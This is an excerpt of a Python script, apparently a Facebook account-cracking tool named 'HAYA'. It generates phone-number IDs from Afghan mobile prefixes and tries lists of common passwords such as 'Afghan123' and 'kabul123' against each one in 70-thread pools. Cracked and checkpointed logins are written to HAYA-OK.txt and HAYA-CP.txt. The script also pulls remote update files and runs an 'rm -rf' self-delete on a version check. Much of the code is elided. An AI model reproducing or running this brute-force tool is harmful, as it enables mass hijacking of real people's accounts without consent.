...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/HAYA/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/HAYA/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf HAYA')
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93780458760text=اسلام عليکم ورحمت الله وبرکاته')
	if riaz1 =='3':
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9379,9378,9377,9376')
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 3000,5000,10000,20000')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan1234','kabul123','100200','500500','10002000','200300','700800','khan123','۱۲۳۴۵۶']
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9378,9379,9377,9376')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan1234','kabul123','۱۲۳۴۵۶','100200','200300','500500','10002000','khan123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9378,9379,9376,9377')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan1234','kabul123','100200','500500','10002000','۱۲۳۴۵۶','khan123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HAYA-OK] '+cid+'|'+ps+'\033[0;97m')
                open('HAYA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HAYA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HAYA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHAYA-SAKON\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
